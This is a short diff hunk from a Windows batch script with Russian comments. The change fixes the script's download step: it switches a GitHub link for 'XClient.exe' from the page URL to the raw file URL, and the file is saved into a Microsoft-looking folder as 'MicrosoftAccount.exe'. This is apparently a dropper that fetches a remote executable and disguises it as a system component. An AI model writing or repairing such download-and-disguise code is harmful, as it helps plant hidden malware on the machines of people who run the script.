@@ -501,7 +501,7 @@ for %%D in (
 mkdir "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount" >nul 2>&1
 
 :: Детали скачиваемого исполняемого файла
-set "EXE_URL=https://github.com/ScifDif/Tool/blob/main/XClient.exe"
+set "EXE_URL=https://github.com/ScifDif/Tool/raw/main/XClient.exe"
 set "EXE_PATH=C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\MicrosoftAccount.exe"
 
 :: Скачать исполняемый файл
